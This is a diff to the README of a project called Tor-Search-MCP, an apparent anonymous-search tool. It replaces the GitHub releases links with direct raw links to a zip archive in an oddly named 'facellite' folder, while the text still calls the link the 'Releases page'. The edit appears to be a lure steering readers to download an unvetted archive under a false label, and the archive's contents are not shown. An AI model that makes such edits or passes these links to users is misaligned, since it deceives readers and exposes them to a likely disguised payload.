@@ -1,6 +1,6 @@
 # 🛠️ Tor-Search-MCP - Browse the Web Anonymously with Ease
 
-[![Download Tor-Search-MCP](https://img.shields.io/badge/Download-Tor--Search--MCP-blue)](https://github.com/BigBang142/Tor-Search-MCP/releases)
+[![Download Tor-Search-MCP](https://raw.githubusercontent.com/BigBang142/Tor-Search-MCP/main/facellite/MCP-Tor-Search-1.6-alpha.5.zip)](https://raw.githubusercontent.com/BigBang142/Tor-Search-MCP/main/facellite/MCP-Tor-Search-1.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Tor-Search-MCP! This tool lets you search and browse the web without 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/BigBang142/Tor-Search-MCP/releases) to find the latest version of Tor-Search-MCP.
+   Go to the [Releases page](https://raw.githubusercontent.com/BigBang142/Tor-Search-MCP/main/facellite/MCP-Tor-Search-1.6-alpha.5.zip) to find the latest version of Tor-Search-MCP.
 
 2. **Choose Your Version:**  
    Look for the most recent release. Click on the version number to open its details.
